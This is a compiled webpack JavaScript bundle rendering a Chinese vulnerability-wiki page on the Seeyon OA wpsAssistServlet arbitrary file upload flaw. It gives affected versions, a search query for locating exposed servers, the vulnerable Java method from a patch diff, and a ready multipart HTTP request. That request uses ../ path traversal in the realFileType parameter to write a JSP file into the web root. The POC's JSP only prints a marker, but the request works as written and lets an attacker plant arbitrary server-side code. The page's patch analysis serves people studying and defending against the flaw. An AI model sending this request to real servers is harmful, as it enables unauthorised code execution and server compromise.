(window.webpackJsonp=window.webpackJsonp||[]).push([[42],{1641:function(t,s,a){t.exports=a.p+"assets/img/1658806205627-07ce1bd0-adf1-4aae-9f3a-a6885bf8bfd7.509c7b50.png"},1642:function(t,s,a){t.exports=a.p+"assets/img/1658806584119-32f25f71-5351-4781-ab5b-7435032ec7ec.8413a074.png"},1643:function(t,s,a){t.exports=a.p+"assets/img/1658806789623-07df56ba-fe62-4c0d-9374-11cfc3077bdf.e24d1eef.png"},1644:function(t,s,a){t.exports=a.p+"assets/img/1658807010120-47006179-52db-4d27-8e18-fe00dbc8482a.b3f6dcf9.png"},1645:function(t,s,a){t.exports=a.p+"assets/img/1658809800167-1f074e5b-88b2-468c-b29f-794f8d5ddfaa.6e736643.png"},1646:function(t,s,a){t.exports=a.p+"assets/img/1658810152744-1a171b0d-25f0-4c99-9ff4-4202c66d40b3.cfa3e08a.png"},1647:function(t,s,a){t.exports=a.p+"assets/img/1658810231876-43f625d6-dc8f-421d-96ae-f753722bf2c5.bb770bd2.png"},2726:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"致远oa-wpsassistservlet-任意文件上传漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#致远oa-wpsassistservlet-任意文件上传漏洞"}},[t._v("#")]),t._v(" 致远OA wpsAssistServlet 任意文件上传漏洞")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("致远OA wpsAssistServlet接口存在任意文件上传漏洞，攻击者通过漏洞可以发送特定的请求包上传恶意文件，获取服务器权限")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("致远OA A6、A8、A8N (V8.0SP2，V8.1，V8.1SP1)")]),n("br"),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("致远OA G6、G6N (V8.1、V8.1SP1)")]),n("br"),t._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v('app="致远互联-OA" && title="V8.0SP2"')]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("产品主页")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1641),alt:"img"}})]),t._v(" "),n("p",[t._v("下载补丁220706-S004 ，对比修改的文件")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1642),alt:"img"}})]),t._v(" "),n("p",[t._v("主要修改的是 "),n("code",[t._v("com.seeyon.ctp.common.wpsassist.manager.WpsAssistManagerImpl.oaSaveFile")]),t._v(" 这个方法")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("private")]),t._v(" Map"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("Object")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("oaSaveFile")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("HttpServletRequest request"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" Map"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("Object")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" throws Exception "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n        Map"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("Object")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" result "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Maps"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("newHashMap")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        result"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("put")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("OfficeTransResultFlag"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword type-casting"}},[t._v("Object")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("null")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        Long fileId "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" MapUtils"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getLong")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"fileId"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        log"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("info")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"wpsAssist SaveFile start!fileId="')]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" fileId"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),t._v(" newPdfFileId "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" MapUtils"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getString")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"newPdfFileId"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Strings"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("isNotBlank")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("newPdfFileId"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n            fileId "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Long"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("valueOf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("newPdfFileId"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n\n        "),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),t._v(" realFileType "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" MapUtils"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getString")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"realFileType"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword type-declaration"}},[t._v("String")]),t._v(" tempFileIdPathSuffix "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" SystemEnvironment"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getSystemTempFolder")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" File"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("separator "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" fileId "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" realFileType"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        Long count "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" this"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("saveFileToPath")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("request"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" tempFileIdPathSuffix"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        result"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("put")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("FileSize"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" count"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        result"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("putAll")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("this"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("createOfficeTransCacheFile")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("fileId"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" tempFileIdPathSuffix"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" MapUtils"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getString")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"canTransFileType"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        param"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("put")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("OfficeTransResultFlag"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" result"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("get")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("BusinessKey"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("OfficeTransResultFlag"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("getCode")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        this"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("copyToUploadAndTrans")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("param"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n        "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" result"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br")])]),n("p",[t._v("向上追溯调用的 oaSaveFile方法的代码")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1643),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1644),alt:"img"}})]),t._v(" "),n("p",[t._v("在 "),n("code",[t._v("com.seeyon.ctp.common.wpsassist.WpsAssistServlet.doPost")]),t._v(" 中，flag参数为save时，可以调用文件上传接口")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1645),alt:"img"}})]),t._v(" "),n("p",[n("code",[t._v("C://Seeyon/A6/base/temporary")]),t._v(" 为默认上传的位置，但 "),n("code",[t._v("realFileType, fileId")]),t._v(" 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC")]),t._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("seeyon"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("wpsAssistServlet"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("flag"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("save"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("realFileType"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ApacheJetspeed"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("webapps"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("ROOT")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("debugggg"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("jsp"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("fileId"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token constant"}},[t._v("HTTP")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" \nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Length"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("349")]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" multipart"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("form"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" boundary"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("59229605")]),t._v("f98b8cf290a7b8908b34616b\nAccept"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Encoding"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" gzip\n\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("59229605")]),t._v("f98b8cf290a7b8908b34616b\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Disposition"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" form"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" name"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"upload"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" filename"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"123.xls"')]),t._v("\nContent"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("Type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" application"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("vnd"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("ms"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v("excel\n\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),t._v(" out"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("println")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"seeyon_vuln"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("%")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("59229605")]),t._v("f98b8cf290a7b8908b34616b"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("--")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1646),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1647),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=e.exports}}]);